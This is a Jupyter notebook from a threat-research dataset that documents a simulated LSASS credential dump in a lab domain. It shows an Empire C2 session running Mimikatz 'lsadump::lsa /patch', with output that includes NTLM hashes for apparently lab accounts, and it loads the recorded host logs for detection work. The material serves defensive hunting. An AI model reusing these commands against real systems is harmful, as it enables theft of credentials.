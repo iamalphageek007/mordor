{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Empire Mimikatz Lsadump LSA Patch"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Author            | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2019/05/18 |\n",
    "| Modification Date | 2020/09/20 |\n",
    "| Tactics           | ['[TA0006](https://attack.mitre.org/tactics/TA0006)'] |\n",
    "| Techniques        | ['[T1003.001](https://attack.mitre.org/techniques/T1003/001)'] |\n",
    "| Tags              | ['LSASS Memory Credentials Read'] |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries reading credentials from the memory contents of lsass.exe. One popular tool performing this behavior is Mimikatz."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "| Dataset Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/credential_access/host/empire_mimikatz_lsadump_patch.zip](https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/credential_access/host/empire_mimikatz_lsadump_patch.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Notebooks\n",
    "Notebooks created by the community leveraging the mordor datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "| Author | Name | Link |\n",
    "|:-------|:-----|:-----|\n",
    "| Threat Hunter Playbook | LSASS Access from Non System Account | [https://threathunterplaybook.com/notebooks/windows/06_credential_access/WIN-170105221010.html](https://threathunterplaybook.com/notebooks/windows/06_credential_access/WIN-170105221010.html) |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Simulation Plan"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "| Environment | Tool Type | Module |\n",
    "|:------------|:----------|:-------|\n",
    "| Mordor shire | C2 | [lsadump](https://github.com/OTRF/Blacksmith/blob/master/aws/mordor/cfn-files/scripts/Invoke-Mimikatz.ps1) |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(Empire: B7Y8G4XC) > usemodule credentials/mimikatz/lsadump*\n",
    "(Empire: powershell/credentials/mimikatz/lsadump) > info\n",
    "\n",
    "              Name: Invoke-Mimikatz LSA Dump\n",
    "            Module: powershell/credentials/mimikatz/lsadump\n",
    "        NeedsAdmin: True\n",
    "        OpsecSafe: True\n",
    "          Language: powershell\n",
    "MinLanguageVersion: 2\n",
    "        Background: True\n",
    "  OutputExtension: None\n",
    "\n",
    "Authors:\n",
    "  @JosephBialek\n",
    "  @gentilkiwi\n",
    "\n",
    "Description:\n",
    "  Runs PowerSploit's Invoke-Mimikatz function to extract a\n",
    "  particular user hash from memory. Useful on domain\n",
    "  controllers.\n",
    "\n",
    "Comments:\n",
    "  http://clymb3r.wordpress.com/ http://blog.gentilkiwi.com htt\n",
    "  ps://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump#ls\n",
    "  a\n",
    "\n",
    "Options:\n",
    "\n",
    "  Name     Required    Value                     Description\n",
    "  ----     --------    -------                   -----------\n",
    "  Agent    True        B7Y8G4XC                  Agent to run module on.                 \n",
    "  Username False                                 Username to extract the hash for, blank \n",
    "                                                for all local passwords.                \n",
    "\n",
    "(Empire: powershell/credentials/mimikatz/lsadump) > execute\n",
    "[*] Tasked B7Y8G4XC to run TASK_CMD_JOB\n",
    "[*] Agent B7Y8G4XC tasked with task ID 2\n",
    "[*] Tasked agent B7Y8G4XC to run module powershell/credentials/mimikatz/lsadump\n",
    "(Empire: powershell/credentials/mimikatz/lsadump) > \n",
    "Job started: VGHXZ5\n",
    "\n",
    "Hostname: WORKSTATION5.theshire.local / S-1-5-21-1363495622-3806888128-621328882\n",
    "\n",
    "  .#####.   mimikatz 2.2.0 (x64) #19041 Aug  4 2020 20:16:54\n",
    ".## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n",
    "## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n",
    "## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n",
    "'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n",
    "  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/\n",
    "\n",
    "mimikatz(powershell) # lsadump::lsa /patch\n",
    "Domain : WORKSTATION5 / S-1-5-21-1549354820-3669603161-4025758380\n",
    "\n",
    "RID  : 000001f7 (503)\n",
    "User : DefaultAccount\n",
    "LM   : \n",
    "NTLM : \n",
    "\n",
    "RID  : 000001f5 (501)\n",
    "User : Guest\n",
    "LM   : \n",
    "NTLM : \n",
    "\n",
    "RID  : 000001f4 (500)\n",
    "User : wardog\n",
    "LM   : \n",
    "NTLM : 42ddb2963bbe8f1c075fc869d3bce33e\n",
    "\n",
    "RID  : 000001f8 (504)\n",
    "User : WDAGUtilityAccount\n",
    "LM   : \n",
    "NTLM : 45a313f1860be24e967e55b94649aa31\n",
    "\n",
    "(Empire: powershell/credentials/mimikatz/lsadump) >\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Explore Mordor Dataset"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Initialize Analytics Engine"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from openhunt.mordorutils import *\n",
    "spark = get_spark()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Download & Process Mordor File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "mordor_file = \"https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/credential_access/host/empire_mimikatz_lsadump_patch.zip\"\n",
    "registerMordorSQLTable(spark, mordor_file, \"mordorTable\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Get to know your data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "df = spark.sql(\n",
    "'''\n",
    "SELECT Hostname,Channel,EventID, Count(*) as count\n",
    "FROM mordorTable\n",
    "GROUP BY Hostname,Channel,EventID\n",
    "ORDER BY count DESC\n",
    "'''\n",
    ")\n",
    "df.show(truncate=False)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "PySpark_Python3",
   "language": "python",
   "name": "pyspark3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
